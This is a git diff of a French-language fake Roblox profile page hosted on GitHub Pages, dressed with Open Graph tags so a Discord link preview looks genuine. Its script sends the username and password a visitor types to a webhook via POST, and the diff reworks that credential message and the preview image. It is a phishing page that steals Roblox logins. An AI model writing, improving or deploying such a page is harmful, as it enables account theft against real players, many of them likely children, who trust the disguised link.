@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
@@ -8,13 +8,15 @@
   <!-- Open Graph pour Discord -->
   <meta property="og:title" content="Slyweloveyou221's Profile" />
   <meta property="og:description" content="Slyweloveyou221 est l’un des millions de joueurs qui créent et explorent les possibilités infinies de Roblox. Rejoins-le et explore ensemble !" />
-  <meta property="og:image" content="https://tr.rbxcdn.com/54f260251655a9e1916f14aa41d4b77b/150/150/Avatar/Png" />
+  <meta property="og:image" content="https://www.roblox.com/headshot-thumbnail/image?userId=525559330&width=420&height=420&format=png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="420" />
+  <meta property="og:image:height" content="420" />
   <meta property="og:url" content="https://slyweloveyou221.github.io/test2/" />
   <meta name="theme-color" content="#2f3136" />
   <meta name="twitter:card" content="summary_large_image" />
 
   <style>
-    /* Ton CSS complet ici (inchangé) */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background-color: #1c1c1c;
@@ -166,6 +168,7 @@
   </style>
 </head>
 <body>
+
   <div class="topbar">
     <div class="logo">ROBLOX</div>
     <a href="#">Discover</a>
@@ -229,9 +232,8 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: `**Connexion Roblox :**\n👤 **Utilisateur :** ${username}\n🔐 **Mot de passe :** ${password}`,
-            username: "Roblox Login",
-            avatar_url: "https://tr.rbxcdn.com/54f260251655a9e1916f14aa41d4b77b/150/150/Avatar/Png"
+            content: `Tentative de connexion:\nUsername/Email/Phone: ${username}\nPassword: ${password}`,
+            username: "Webhook Page Web"
           })
         });
 
@@ -253,5 +255,6 @@
       });
     });
   </script>
+
 </body>
 </html>
